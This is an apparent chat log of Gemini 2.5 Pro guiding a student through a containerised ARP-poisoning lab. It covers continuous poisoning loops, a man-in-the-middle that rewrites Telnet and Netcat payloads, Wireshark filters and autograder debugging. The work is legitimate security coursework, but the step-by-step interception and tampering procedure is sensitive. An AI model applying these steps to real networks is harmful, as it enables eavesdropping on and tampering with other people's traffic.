3.  **Enable IP Forwarding (on Host M):**
    ```bash
    # On Host M terminal
    sudo sysctl net.ipv4.ip_forward=1
    ```

4.  **Start Netcat Server (on Host B):**
    *   Open a terminal to Host B (`docker exec -it 51a2027240d3 bash`).
    *   Start Netcat listening on port 9090:
    ```bash
    # On Host B terminal
    nc -lp 9090
    ```
    *   It will wait for a connection.

5.  **Start Netcat Client (on Host A):**
    *   Open a terminal to Host A (`docker exec -it fc50e4e36736 bash`).
    *   Connect to Host B's Netcat server:
    ```bash
    # On Host A terminal
    nc 10.9.0.6 9090
    ```
    *   The connection should establish (no output initially, just a waiting cursor). You can test by typing something like "hello" on A and pressing Enter; it should appear on B's terminal.

6.  **Disable IP Forwarding (on Host M) - CRITICAL STEP:**
    ```bash
    # On Host M terminal
    sudo sysctl net.ipv4.ip_forward=0
    ```

7.  **Run the MITM Script (on Host M):**
    ```bash
    # On Host M terminal
    sudo python3 mitm_netcat.py
    ```
    *   You should see the "MITM Netcat Script Started..." message.

8.  **Trigger the Attack (on Host A):**
    *   Go back to the **Host A terminal** where Netcat is connected.
    *   **Type your exact student ID** (the one you put in the script) and **press Enter**.

9.  **Observe the Results:**
    *   **Host B Terminal:** Instead of your student ID, you should see a string of lowercase 'a's with the same length as your student ID appear.
    *   **Host M Terminal:** The `mitm_netcat.py` script should print output showing it processed a packet A->B (original student ID, modified 'aaaa...') and forwarded any replies B->A.
    *   **Wireshark:** Examine the packets captured around the time you sent your ID. You need to find:
        1.  Packet from A (`10.9.0.5`) -> M (MAC `02:42:0a:09:00:69`) [TCP Port 9090, Payload: your student ID]
        2.  Packet from M (MAC `02:42:0a:09:00:69`) -> B (`10.9.0.6`) [TCP Port 9090, Payload: "aaaa..." (same length as your ID)]

10. **Stop the Attack:**
    *   Press `Ctrl+C` in the Host M terminal running `mitm_netcat.py`.
    *   Press `Ctrl+C` in the Host A and Host B terminals to close the Netcat sessions.

11. **Stop Wireshark and Save:**
    *   Stop the Wireshark capture.
    *   Go to `File -> Save As...`.
    *   Name the file `your_netid.pcap`.
    *   **CRITICAL:** Ensure the "Save as type" is set to `Wireshark/tcpdump/... - pcap` ( **NOT pcapng** ).
    *   Save the file.

You now have the `your_netid.pcap` file containing packets from all tasks (1A, 1B, 1C, 2, 3) and your `settings.txt` file ready for submission.

### Assistant (gemini-2.5-pro)

You've hit on a very common and realistic challenge with ARP poisoning MITM attacks! ARP cache entries are temporary and hosts can (and do) send out legitimate ARP traffic that corrects the poisoned entries.

Here's why this is happening and how to address it:

1.  **ARP Cache Timeout:** ARP entries don't last forever. After a certain period (which varies by OS, often minutes), an entry expires, and the host will send a new ARP request to find the *real* MAC address next time it needs to communicate.
2.  **Legitimate ARP Traffic:** Even without timeouts, hosts might send ARP requests or replies for various reasons:
    *   **ARP Probes:** When an interface comes up or changes IP, it might send an ARP probe ("Is anyone using this IP?") or a gratuitous ARP ("I am at this IP/MAC").
    *   **Communication Failures:** If Host A sends data to M (thinking it's B), and your `mitm_netcat.py` script *fails* to correctly forward the packet (or the reply from B back to A), Host A's TCP stack might eventually time out and trigger a *new* ARP request for B's IP (`10.9.0.6`) to see if it's still reachable. Host B will reply with its *real* MAC, correcting A's cache. The same can happen in reverse for B trying to reach A.
3.  **The Timing:** You disable forwarding and run your script. When Host A sends the Netcat data (`iae225`), it goes to Host M. Your script needs to process it *and* forward it to B. Then, B sends data/ACKs back to A, which also go to M. Your script needs to forward *those* back to A. If *any* part of this relay fails or is too slow while `ip_forward=0`, the original sender/receiver might think the other end is down and send an ARP request, leading to the cache correction you observed.

**Solution: Continuous Poisoning**

The standard way to maintain an ARP poisoning attack is to **continuously re-send the malicious ARP replies** frequently enough to overwrite any corrections before they matter or before the cache entries expire.

**How to Implement Continuous Poisoning:**

You need to run the `poison_a.py` and `poison_b.py` scripts repeatedly in the background *while* your `mitm_netcat.py` script is running.

**Method 1: Simple Background Loops (Easiest for the lab)**

1.  **Open two *new* terminals connected to Host M.** (You'll now have one for `mitm_netcat.py`, one for poisoning A, and one for poisoning B).
2.  **In the first new Host M terminal, run:**
    ```bash
    # Terminal 1 (Poison A) - on Host M
    while true; do sudo python3 poison_a.py; sleep 2; done
    ```
    This will send a poison packet to Host A every 2 seconds.
3.  **In the second new Host M terminal, run:**
    ```bash
    # Terminal 2 (Poison B) - on Host M
    while true; do sudo python3 poison_b.py; sleep 2; done
    ```
    This will send a poison packet to Host B every 2 seconds.
4.  **Now, follow the steps for the Netcat MITM again:**
    *   Ensure `ip_forward=1` (on Host M).
    *   Start `nc -lp 9090` (on Host B).
    *   Start `nc 10.9.0.6 9090` (on Host A).
    *   Set `ip_forward=0` (on Host M).
    *   Run `sudo python3 mitm_netcat.py` (in your original Host M terminal).
    *   Type your student ID (`iae225`) on Host A and press Enter.
    *   Check Host B's output.

With the poisoning loops running constantly in the background, the ARP caches on A and B should remain poisoned even if they try to correct themselves.

**Method 2: Integrated Poisoning (More advanced, not needed for lab)**

A more sophisticated approach would modify the `mitm_netcat.py` script to also send ARP poison packets periodically using Python's threading, but the separate loops are simpler and sufficient here.

Try the continuous poisoning method with the background loops and see if Task 3 works correctly now. Remember to stop the loops (`Ctrl+C` in their respective terminals) when you're done.

ok, now, for submission, i need to run all of the things back to back?

### Assistant (gemini-2.5-pro)

Yes, exactly! Since the requirement is to submit **one single `.pcap` file** containing the evidence for *all* tasks, you need to perform all the actions sequentially while Wireshark is running a single, continuous capture.

Here is the recommended workflow for generating your final `netid.pcap` file:

1.  **Preparation:**
    *   Have all your scripts ready on Host M (`task1a.py`, `task1b.py`, `task1c.py`, `poison_a.py`, `poison_b.py`, `mitm_telnet.py`, `mitm_netcat.py` with your student ID correctly inserted).
    *   Have terminals open and ready for Host A, Host B, and at least three for Host M (one for main commands, two for background poisoning).
    *   Know your `br-xxxx` interface name for Wireshark.

2.  **Start Wireshark Capture:**
    *   Open Wireshark on your host machine.
    *   Select the correct `br-xxxx` interface.
    *   **Start the capture.** Do NOT stop it until the very end.

3.  **Execute Task 1 (A, B, C):**
    *   **Task 1.A:** Run `sudo python3 task1a.py` on M. (Optional: check `arp -n` on A).
    *   **Task 1.B (Scenario 1):** Ping B from A, check A's cache, run `sudo python3 task1b.py` on M, check A's cache again.
    *   **Task 1.B (Scenario 2):** Clear B's entry on A (`arp -d`), check A's cache, run `sudo python3 task1b.py` on M, check A's cache again.
    *   **Task 1.C (Scenario 1):** Ping B from A, check A's cache, run `sudo python3 task1c.py` on M, check A's cache again.
    *   **Task 1.C (Scenario 2):** Clear B's entry on A, check A's cache, (maybe `sysctl ... arp_accept=1` on A if needed), run `sudo python3 task1c.py` on M, check A's cache again.
    *   *(Ensure the relevant ARP packets for all these steps appear in Wireshark)*

4.  **Execute Task 2 (Telnet MITM):**
    *   **Start Continuous Poisoning:** In two separate Host M terminals, start the background loops:
        *   Terminal M1: `while true; do sudo python3 poison_a.py; sleep 2; done`
        *   Terminal M2: `while true; do sudo python3 poison_b.py; sleep 2; done`
    *   **Set up Connection:**
        *   `sudo sysctl net.ipv4.ip_forward=1` on M (main terminal).
        *   `telnet 10.9.0.6` on A, log in (`seed`/`dees`).
    *   **Enable MITM:**
        *   `sudo sysctl net.ipv4.ip_forward=0` on M (main terminal).
        *   `sudo python3 mitm_telnet.py` on M (main terminal).
    *   **Trigger Attack:** Type a single 'Q' in the Telnet session on A. Verify 'Z' appears.
    *   **Stop MITM Script:** `Ctrl+C` in the `mitm_telnet.py` terminal on M.
    *   **Stop Continuous Poisoning:** `Ctrl+C` in the background loop terminals (M1 and M2).
    *   *(Ensure the A->M('Q'), M->B('Z'), B->M('Z'), M->A('Z') packets are captured)*

5.  **Execute Task 3 (Netcat MITM):**
    *   **Start Continuous Poisoning:** Restart the background loops in the separate Host M terminals:
        *   Terminal M1: `while true; do sudo python3 poison_a.py; sleep 2; done`
        *   Terminal M2: `while true; do sudo python3 poison_b.py; sleep 2; done`
    *   **Set up Connection:**
        *   `sudo sysctl net.ipv4.ip_forward=1` on M (main terminal).
        *   `nc -lp 9090` on B.
        *   `nc 10.9.0.6 9090` on A.
    *   **Enable MITM:**
        *   `sudo sysctl net.ipv4.ip_forward=0` on M (main terminal).
        *   `sudo python3 mitm_netcat.py` on M (main terminal).
    *   **Trigger Attack:** Type your student ID (`iae225`) in the Netcat session on A and press Enter. Verify 'aaaaaa' appears on B.
    *   **Stop MITM Script:** `Ctrl+C` in the `mitm_netcat.py` terminal on M.
    *   **Stop Continuous Poisoning:** `Ctrl+C` in the background loop terminals (M1 and M2).
    *   **Stop Netcat:** `Ctrl+C` on A and B.
    *   *(Ensure the A->M('iae225'), M->B('aaaaaa') packets are captured)*

6.  **Stop Wireshark and Save:**
    *   Go to Wireshark.
    *   **Stop the capture.**
    *   Save the file as `your_netid.pcap`, making absolutely sure the type is **pcap**, not pcapng.

7.  **Prepare `settings.txt`:** Make sure your `settings.txt` file is correctly filled out.

8.  **Submit:** Upload the generated `your_netid.pcap` and the `settings.txt` file to Gradescope.

This ensures all required evidence is in one file. It's a bit tedious, but it's the standard way to collect proof for multi-stage network labs like this. Good luck!

### Assistant (gemini-2.5-pro)

Okay, this Gradescope feedback is very informative, even though it's frustrating! It tells us the autograder isn't finding the *specific packets* it expects for each task within your submitted `.pcap` file. Let's break down the likely reasons based on the feedback and your Wireshark examples:

1.  **Tasks 1A, 1B, 1C Failures:**
    *   **Feedback:** "check your MAC or IP addresses...", "make sure you're using the right code..."
    *   **Wireshark:** Your examples (frames 224, 225, 211) show ARP *replies* used for poisoning (likely from `poison_a.py`/`poison_b.py` or maybe `task1b.py`).
    *   **Likely Cause:** The autograder needs to see the *specific* ARP packets generated by `task1a.py` (an ARP **Request** with specific fields), `task1b.py` (an ARP **Reply** with specific fields), and `task1c.py` (a **Gratuitous ARP Request** with specific fields) *during the capture*. It seems your capture might only contain the ARP replies used for setting up the MITM (Tasks 2/3), or the Task 1 packets weren't generated correctly during the final run.
    *   **Solution:** During your single, continuous capture run, you **must explicitly execute** `sudo python3 task1a.py`, `sudo python3 task1b.py` (for both scenarios), and `sudo python3 task1c.py` (for both scenarios) at the appropriate points, as outlined in the detailed step-by-step plan. Ensure the IPs/MACs within *these specific scripts* match your `settings.txt`.

2.  **Task 2A (Telnet) Failure:**
    *   **Feedback:** "No telnet packet found with a Q payload and no spoof packet found with a Z payload"
    *   **Likely Cause:** This is critical. It means when you performed the Telnet part of your final capture run, *neither* the original packet containing 'Q' sent from A *nor* the modified packet containing 'Z' sent from M were captured correctly. This points to a failure in the execution sequence or the MITM script itself during the capture:
        *   Was `ip_forward` definitely set to `0` *before* you typed 'Q'?
        *   Was the `sudo python3 mitm_telnet.py` script running *without errors* in the Host M terminal when you typed 'Q'? Did it print any processing messages?
        *   Did the continuous ARP poisoning (background loops) stop working, allowing the cache to correct itself before you typed 'Q'?
        *   Did you type exactly one uppercase 'Q'?
    *   **Solution:** Re-run the Task 2 sequence very carefully during the capture, paying close attention to:
        1.  Starting background poisoning loops.
        2.  Setting `ip_forward=1`.
        3.  Establishing the Telnet connection and logging in.
        4.  Setting `ip_forward=0`.
        5.  Running `sudo python3 mitm_telnet.py` and ensuring it stays running without errors.
        6.  Typing 'Q' on Host A.
        7.  Stopping the MITM script and poisoning loops *after* verifying the result (or capturing the attempt).

3.  **Task 3A (Netcat) Failure:**
    *   **Feedback:** "no packets found that are related to Task 3A"
    *   **Likely Cause:** Similar to Task 2, the entire sequence for the Netcat MITM seems to be missing from the capture file the autograder analyzed. The expected packets (A sending `iae225`, M sending `aaaaaa`, on port 9090) were not found. The reasons are likely the same as for Task 2: incorrect execution order, `ip_forward` not being 0, `mitm_netcat.py` not running or erroring, ARP poisoning failing, or the trigger data (`iae225` + Enter) not being sent correctly during the capture.
    *   **Solution:** Re-run the Task 3 sequence carefully during the capture, following the exact steps: background poisoning, `ip_forward=1`, start `nc` server/client, `ip_forward=0`, run `mitm_netcat.py`, send student ID from A, verify result on B, stop scripts. Ensure `mitm_netcat.py` has the correct student ID (`iae225`) hardcoded.

**Overall Conclusion:**

The most probable reason for all these failures is that the **single, continuous capture run did not correctly include the execution and resulting packets for *all* the required steps in the correct order.**

**Recommendation:**

You need to perform **one more capture run**. Follow the detailed step-by-step plan provided previously *exactly*.

1.  **Start Wireshark** (correct interface, capture running).
2.  **Execute Task 1A, 1B (Scen 1&2), 1C (Scen 1&2)** using the specific `task1X.py` scripts.
3.  **Execute Task 2** (background poisoning, forward=1, connect, forward=0, run `mitm_telnet.py`, type 'Q', stop scripts).
4.  **Execute Task 3** (background poisoning, forward=1, connect, forward=0, run `mitm_netcat.py`, type student ID, stop scripts).
5.  **Stop Wireshark** and save as `.pcap`.

Pay extremely close attention to the `ip_forward` status and ensure the MITM scripts are running without errors in the foreground when you send the trigger data ('Q' or student ID). Check the console output of the MITM scripts for confirmation they are processing packets.

see the attach screenshots, there are definitely packets witht he payload required, but it is not finding it. could our setting sbe wrong?

### Assistant (gemini-2.5-pro)

Okay, this is a classic case of "it looks right in Wireshark, but the autograder disagrees." Based on your screenshots, you *do* have the correct packets for Task 2 (Telnet MITM)!

*   **Frame 662:** Shows A (`10.9.0.5`) sending to M (`02:42:0a:09:00:69` - check Ethernet Dst) with Telnet data 'Q'. **This is correct A->M.**
*   **Frame 663:** Shows M (`02:42:0a:09:00:69` - check Ethernet Src) sending to B (`02:42:0a:09:00:06` - check Ethernet Dst) with TCP data `5a` ('Z'). **This is correct M->B.**
*   **Frame 665:** Shows B (`10.9.0.6`) sending to M (`02:42:0a:09:00:69` - check Ethernet Dst) with Telnet data 'Z'. **This is correct B->M.**
*   **Frame 666:** Shows M (`02:42:0a:09:00:69` - check Ethernet Src) sending to A (`02:42:0a:09:00:05` - check Ethernet Dst) with TCP data `5a` ('Z'). **This is correct M->A.**

Since the packets *are* there, let's reconsider why Gradescope might be failing:

1.  **`.pcap` vs `.pcapng` (Most Likely Culprit):** Are you **1000% certain** you saved the file as `.pcap` and *not* the default `.pcapng`? Autograders often cannot parse `.pcapng`.
    *   **How to check:** On a Linux/macOS system, you can run `file your_netid.pcap`. If it's correct, it should say something like `tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length XXX)`. If it mentions "pcap-ng", it's wrong.
    *   **How to fix:** Re-open the capture in Wireshark and use `File -> Save As...`, then explicitly select `Wireshark/tcpdump/... - pcap (*.pcap)` in the "Save as type" dropdown.

2.  **`settings.txt` Accuracy (Double-Check Case and Spaces):**
    *   The instructions say "Lowercase MAC addresses only please". Your `settings.txt` looks correct, but ensure there are no accidental uppercase letters or leading/trailing spaces on any line.
    *   Is `payload=iae225` exactly correct? No typos?

3.  **Capture Interface:** Was the capture *definitely* run only on the `br-xxxx` interface? Capturing on "any" or a physical interface can alter L2 headers, confusing the autograder which relies on seeing the MAC addresses change correctly (A->M, M->B, etc.).

4.  **Payload Exactness (Less Likely for Task 2, but possible):** Did you type *only* 'Q' and nothing else (like Enter immediately after)? While Telnet often sends character by character, extra inputs could confuse a strict checker.

5.  **Task 1 Packet Issues:** Even though the Task 2 packets look right, the failures on Task 1 suggest those specific ARP packets (Request for 1A, Reply for 1B, Gratuitous for 1C) might be missing or malformed in the capture. Did you explicitly run `task1a.py`, `task1b.py`, `task1c.py` during the final capture run? The autograder needs to see those specific packet types, not just the ARP replies from `poison_a.py`/`poison_b.py`.

6.  **Task 3 Missing:** The feedback "no packets found that are related to Task 3A" is strong. Did the Netcat part definitely happen *during the same capture*? Did you type `iae225` and press Enter on Host A while `mitm_netcat.py` was running (with `ip_forward=0`)? Did Host B receive `aaaaaa`?

**Recommendations:**

1.  **Verify `.pcap` format:** This is the most common reason for this type of discrepancy. Re-save from Wireshark if unsure.
2.  **Scrutinize `settings.txt`:** Check for hidden spaces or case issues.
3.  **Review Capture Process:** Mentally walk through your capture run. Did you perform *every single step* from Task 1A through Task 3, including running the specific `task1X.py` scripts and the MITM scripts with the correct triggers ('Q', 'iae225'+Enter), all within one continuous Wireshark session saved correctly?
4.  **Minimal Test (If needed):** Try capturing *only* Task 2 again. Start capture, run `poison_a/b` loops, set `ip_forward=1`, connect Telnet, set `ip_forward=0`, run `mitm_telnet.py`, type 'Q', stop MITM/poisoning, stop capture, save as `.pcap`. Submit *just* this minimal capture with `settings.txt`. If Task 2 passes now, it means something went wrong integrating all tasks. If it still fails, it strongly points to format (`.pcapng`), interface, or `settings.txt` issues.

### User

what filter can i apply to check if task 3 was done?


---

### Assistant (gemini-2.5-pro)

Okay, to check if the specific Netcat traffic for Task 3 was captured, you can use a Wireshark display filter that focuses on the port and IP addresses involved.

**Recommended Filter:**

```
tcp.port == 9090 and ip.addr == 10.9.0.5 and ip.addr == 10.9.0.6
```

**Explanation:**

*   `tcp.port == 9090`: This selects only TCP packets where either the source or destination port is 9090 (the port Netcat is using in this task).
*   `ip.addr == 10.9.0.5`: This ensures that Host A's IP address is involved (either as source or destination).
*   `ip.addr == 10.9.0.6`: This ensures that Host B's IP address is involved (either as source or destination).
*   `and`: Combines these conditions so you only see packets matching all criteria.

**How to Use It:**

1.  Open your `.pcap` file in Wireshark.
2.  Type the filter string above into the "Apply a display filter..." bar at the top and press Enter.

**What to Look For:**

Once the filter is applied, examine the packets that remain:

1.  **Packet from A -> M:** Look for a packet with:
    *   IP Source: `10.9.0.5`
    *   IP Destination: `10.9.0.6`
    *   Ethernet Source MAC: `02:42:0a:09:00:05` (MAC_A)
    *   Ethernet Destination MAC: `02:42:0a:09:00:69` (MAC_M)
    *   TCP Payload: Contains your student ID (`iae225`). Check the packet details pane.
2.  **Packet from M -> B:** Look for a packet shortly after the first one with:
    *   IP Source: `10.9.0.5`
    *   IP Destination: `10.9.0.6`
    *   Ethernet Source MAC: `02:42:0a:09:00:69` (MAC_M)
    *   Ethernet Destination MAC: `02:42:0a:09:00:06` (MAC_B)
    *   TCP Payload: Contains the replacement string (`aaaaaa`). Check the packet details pane.

If you find packets matching these criteria (especially the payloads and the changing Ethernet MAC addresses), then the evidence for Task 3 *should* be in your capture file. If you don't find them, the Task 3 execution likely didn't happen correctly during the capture.

### Assistant (gemini-2.5-pro)

You are absolutely correct! Those screenshots clearly show:

1.  **Frame 1315:** Packet from A (`10.9.0.5`) to B (`10.9.0.6`) with Ethernet Destination MAC M (`02:42:0a:09:00:69`) containing the payload `iae225\n`. **This is the required A->M packet for Task 3.**
2.  **Frame 1316:** Packet from A (`10.9.0.5`) to B (`10.9.0.6`) with Ethernet Source MAC M (`02:42:0a:09:00:69`) and Ethernet Destination MAC B (`02:42:0a:09:00:06`) containing the payload `aaaaaa\n`. **This is the required M->B packet for Task 3.**

So, the necessary evidence for Task 3 *is* present in the capture you examined.

This makes the Gradescope feedback "no packets found that are related to Task 3A" even more puzzling, but it strongly points away from errors in your MITM script's logic or execution for Task 3 itself. The problem must lie elsewhere in the submission process or file contents:

1.  **`.pcap` Format:** This remains the **highest probability** cause. Please double, triple-check that the file submitted was saved explicitly as `.pcap` and not `.pcapng`.
2.  **Completeness of the Capture:** Did the *same capture file* that contains these Task 3 packets *also* contain the specific ARP packets required for Task 1 (the ARP Request from `task1a.py`, the ARP Reply from `task1b.py`, the Gratuitous ARP from `task1c.py`) and the Telnet Q/Z packets for Task 2? The autograder processes the *entire file* and might stop or fail if earlier required packets are missing or incorrect.
3.  **`settings.txt`:** While it seems correct, ensure there are absolutely no hidden characters, incorrect line endings (use Unix-style LF, not Windows CRLF if possible), or case mismatches.
4.  **Capture Interface:** Confirm again the capture was *only* on the `br-xxxx` interface.
5.  **Autograder Specificity:** It's *possible* the autograder is extremely sensitive to the exact sequence or timing, or perhaps looks for specific TCP flags in addition to the payload, but given the clear presence of the payload data, format/completeness issues are more likely.

**Action Plan:**

1.  **Re-save as `.pcap`:** Open your capture file in Wireshark and explicitly save it again using `File -> Save As...` and selecting the `.pcap` type.
2.  **Verify Task 1 & 2 Packets:** Briefly apply filters to check if the specific packets for Task 1A (ARP Request, `arp.opcode == 1`), 1B (ARP Reply, `arp.opcode == 2`), 1C (Gratuitous ARP, `arp.opcode == 1 and arp.src.proto_ipv4 == arp.dst.proto_ipv4 and eth.dst == ff:ff:ff:ff:ff:ff`), and Task 2 (Telnet Q/Z, `tcp.port == 23`) are also present in this *same* file.
3.  **Resubmit:** Submit the newly saved `.pcap` file along with the verified `settings.txt`.

If the packets for all tasks are demonstrably present in the correctly formatted `.pcap` file, and `settings.txt` is perfect, then the issue might be with the autograder itself, but exhausting the common submission errors first is essential.

do these look good? also, yes, it is pcap

![Screenshot 2025-04-16 at 10.30.57 PM.png](https://utfs.io/f/IN4OjmY4wMHBKCmnh0JQk65JDvuxylLpwZjzaYCBsbV1oRNi)

---

### Assistant (gemini-2.5-pro)

Okay, let's analyze these ARP packets based on the filters:

**Analysis of `arp.opcode == 1` (ARP Requests):**

*   **Packet 1:** `Src: MAC_M`, `Dst: MAC_A`, Info: "Who has 10.9.0.5? Tell 10.9.0.6".
    *   This packet has Sender IP `10.9.0.6` (IP_B) and Target IP `10.9.0.5` (IP_A).
    *   This **perfectly matches** the specific ARP Request packet structure required for **Task 1A**.
*   **Packet 127 & 177:** `Src: MAC_M`, `Dst: Broadcast`, Info: "Gratuitous ARP for 10.9.0.6 (Request)".
    *   These have Sender IP `10.9.0.6` (IP_B) and Target IP `10.9.0.6` (IP_B), sent to broadcast.
    *   These **perfectly match** the specific Gratuitous ARP Request packet structure required for **Task 1C**.
*   **Other Requests:** The rest are mostly standard ARP lookups ("Who has X?") initiated by various hosts, which is normal network activity.

**Analysis of `arp.opcode == 2` (ARP Replies):**

*   **Packet 224:** `Src: MAC_M`, `Dst: MAC_A`, Info: "10.9.0.6 is at 02:42:0a:09:00:69".
    *   This packet has Sender IP `10.9.0.6` (IP_B), Sender MAC `MAC_M`, Target IP `IP_A`, Target MAC `MAC_A`.
    *   This **perfectly matches** the specific ARP Reply packet structure required for **Task 1B**.
*   **Packets like 225, 200, 201, 202, etc.:** These are the ARP replies generated by your `poison_a.py` and `poison_b.py` scripts, likely running in the background loops during Tasks 2 and 3. They show `MAC_M` claiming both `IP_A` and `IP_B`. While necessary for the MITM, they are *not* the specific single packet the autograder looks for to verify Task 1B itself (which is Packet 224).

**Conclusion:**

Based on these screenshots:

1.  You **DO** have the specific, correctly formatted ARP Request packet required for Task 1A (Packet 1).
2.  You **DO** have the specific, correctly formatted ARP Reply packet required for Task 1B (Packet 224).
3.  You **DO** have the specific, correctly formatted Gratuitous ARP Request packets required for Task 1C (Packets 127, 177).
4.  We previously confirmed you have the correct Telnet Q/Z packets for Task 2.
5.  We previously confirmed you have the correct Netcat ID/aaaaaa packets for Task 3.
6.  You've confirmed the file is saved as `.pcap`.

**Why is Gradescope still failing?**

This is extremely strange. With all required packets seemingly present and correctly formatted, the possibilities narrow down significantly:

1.  **`settings.txt` - The Last Stand:** This becomes the prime suspect again.
    *   **Hidden Characters/Spaces:** Copy the *exact* text from your `settings.txt` and paste it into a very plain text editor (like `nano` in Linux, or Notepad on Windows - *not* Word). Manually retype it if necessary. Ensure there are NO spaces before or after the `=` or at the end of lines.
    *   **Line Endings:** If you created the file on Windows, it might have CRLF line endings instead of the LF endings expected by Linux-based graders. Use a tool (like `dos2unix` on Linux or advanced modes in editors like Notepad++) to convert line endings to LF (Unix format).
    *   **Filename:** Is the file *exactly* `settings.txt` (all lowercase)?
2.  **File Upload Issue:** Could the file have been corrupted during upload to Gradescope? (Unlikely but possible). Try uploading again.
3.  **Autograder Bug:** It's genuinely possible there's an issue with the autograding script itself if all the evidence is verifiably present in the correct format.

**Recommendation:**

1.  **Sanitize `settings.txt`:** Create a brand new `settings.txt` file using `nano settings.txt` directly within your Linux environment (like on Host M or your main SEED VM). Carefully type or paste the required lines, ensuring no extra spaces and correct case. Save it.
2.  **Resubmit:** Upload the `.pcap` file (which seems correct) and this newly sanitized `settings.txt`.

If it *still* fails after meticulously checking `settings.txt` and confirming the `.pcap` format, you should contact your TA or instructor. Explain that you have verified in Wireshark that all required packets (Tasks 1A, 1B, 1C, 2, and 3) are present in the `.pcap` file (you can even provide timestamps/frame numbers) and that `settings.txt` has been carefully checked, but the autograder is reporting failures. They may need to manually inspect your file or check the grading script.

### User

rewrite settings.txt: IP_A= 
MAC_A= 
IP_B= 
MAC_B= 
MAC_M= 
payload=


---

### Assistant (gemini-2.5-pro)

Okay, based on the IP/MAC addresses identified earlier (`docker inspect` output) and the student ID used in Task 3 (`iae225`), here is the content for your `settings.txt` file.

**Copy and paste this *exactly* into a plain text file named `settings.txt`:**

```text
IP_A=10.9.0.5
MAC_A=02:42:0a:09:00:05
IP_B=10.9.0.6
MAC_B=02:42:0a:09:00:06
MAC_M=02:42:0a:09:00:69
payload=iae225
```

**Important Checks:**

*   Ensure there are **no spaces** before or after the `=` signs.
*   Ensure there are **no spaces** at the end of any line.
*   Ensure the MAC addresses are all **lowercase**.
*   Ensure the filename is exactly `settings.txt`.
*   Ensure the file uses standard Unix line endings (LF) if possible (most Linux editors do this by default).

### User

IS there a way to trim the pcap file? like exporting certain No.?


---

### Assistant (gemini-2.5-pro)

Yes, there are several ways to trim `.pcap` files or export specific packets, both using the Wireshark GUI and command-line tools.

**Important Warning for This Lab:** Remember that for the Gradescope submission, you are required to submit **one single `.pcap` file containing the packets for ALL tasks (1A, 1B, 1C, 2, 3)**. Trimming the file or exporting only certain packets will likely cause the autograder to fail because it won't find the required evidence for all parts. These methods are useful for analysis or troubleshooting, but **do not use them on the file you plan to submit.**

Here are the common methods:

**1. Using Wireshark GUI (Easiest for Visual Selection)**

*   **Exporting Specific Packet Numbers:**
    1.  Open your `.pcap` file in Wireshark.
    2.  Go to `File -> Export Specified Packets...`.
    3.  In the dialog box:
        *   Select the **"Packet Range"** radio button.
        *   Enter the desired range(s) of packet numbers. You can specify single numbers, ranges, or combinations separated by commas.
            *   Example: `1-100` (packets 1 through 100)
            *   Example: `1, 5, 10-20, 50` (packets 1, 5, 10 through 20, and 50)
        *   Choose a filename for the new, smaller `.pcap` file.
        *   **Ensure the "Save as type" is `Wireshark/tcpdump/... - pcap`**.
        *   Click "Save".
*   **Exporting Selected Packets:**
    1.  Select the packets you want in the packet list pane (use Ctrl+Click for multiple individual packets, Shift+Click for a range).
    2.  Go to `File -> Export Specified Packets...`.
    3.  Select the **"Selected packet"** radio button.
    4.  Choose a filename and save as `.pcap`.
*   **Exporting Displayed Packets (After Filtering):**
    1.  Apply a display filter (like `tcp.port == 9090` or `arp`) to show only the packets you're interested in.
    2.  Go to `File -> Export Specified Packets...`.
    3.  Select the **"Displayed"** radio button.
    4.  Choose a filename and save as `.pcap`.

**2. Using `editcap` (Command-Line Tool - Part of Wireshark Suite)**

`editcap` is specifically designed for manipulating capture files.

*   **Selecting by Packet Number/Range:**
    ```bash
    editcap -r input.pcap output.pcap <range> [<range> ...]
    ```
    *   Replace `input.pcap` with your original file.
    *   Replace `output.pcap` with the desired name for the trimmed file.
    *   Replace `<range>` with packet numbers or ranges (syntax is `start-end` or just a single number).
    *   Example: `editcap -r full_capture.pcap task1a.pcap 1` (Exports only packet 1)
    *   Example: `editcap -r full_capture.pcap task2_packets.pcap 662-666` (Exports packets 662 through 666)
    *   Example: `editcap -r full_capture.pcap combined.pcap 1 224 127 662-666 1315-1316` (Exports specific packets/ranges for different tasks into one file)

*   **Selecting by Time:**
    ```bash
    editcap -A "<YYYY-MM-DD HH:MM:SS>" -B "<YYYY-MM-DD HH:MM:SS>" input.pcap output.pcap
    ```
    *   `-A`: Start time
    *   `-B`: Stop time

**3. Using `tshark` (Command-Line Tool - Part of Wireshark Suite)**

You can use `tshark` with display filters to read an input file and write a filtered output file.

*   **Filtering by Content and Writing:**
    ```bash
    tshark -r input.pcap -w output.pcap -Y "<display_filter>"
    ```
    *   Example: `tshark -r full_capture.pcap task3.pcap -Y "tcp.port == 9090 and ip.addr == 10.9.0.5 and ip.addr == 10.9.0.6"`
*   **Filtering by Frame Number:**
    ```bash
    tshark -r input.pcap -w output.pcap -Y "frame.number >= 662 and frame.number <= 666"
    ```

Again, while these tools are powerful for managing captures, **do not trim or filter the `.pcap` file you intend to submit for this lab.** Submit the complete capture containing all steps.

### User

what packets should i export for part 1 (1.1, 1.2, 1.3)?


---

### Assistant (gemini-2.5-pro)

Okay, let's identify the *key representative packets* for each part of Task 1 based on your previous Wireshark analysis.

**Crucial Reminder:** As mentioned before, you **should NOT actually export only these packets for submission**. The autograder needs the *entire, continuous capture file* containing evidence for Tasks 1, 2, and 3. Exporting only these specific packets is useful for your own verification or understanding, but submitting a trimmed file will result in failure.

Based on the frame numbers we identified earlier:

1.  **Task 1.A (ARP Request):**
    *   **Required Packet:** The specific ARP Request sent from M (`02:42:0a:09:00:69`) to A (`02:42:0a:09:00:05`), where the ARP layer claims IP_B (`10.9.0.6`) is the sender asking about IP_A (`10.9.0.5`).
    *   **Your Frame Number:** **Frame 1** (as identified in the `arp.opcode == 1` screenshot).

2.  **Task 1.B (ARP Reply):**
    *   **Required Packet:** The specific ARP Reply sent from M (`02:42:0a:09:00:69`) to A (`02:42:0a:09:00:05`), where the ARP layer states that IP_B (`10.9.0.6`) is at MAC_M (`02:42:0a:09:00:69`).
    *   **Your Frame Number:** **Frame 224** (as identified in the `arp.opcode == 2` screenshot).

3.  **Task 1.C (Gratuitous ARP Request):**
    *   **Required Packet:** The specific Gratuitous ARP Request sent from M (`02:42:0a:09:00:69`) to Broadcast (`ff:ff:ff:ff:ff:ff`), where the ARP layer announces that IP_B (`10.9.0.6`) is at MAC_M (`02:42:0a:09:00:69`) (Sender IP = Target IP = IP_B).
    *   **Your Frame Numbers:** **Frame 127** or **Frame 177** (either one represents the correct packet structure, as identified in the `arp.opcode == 1` screenshot). Let's just pick **Frame 127**.

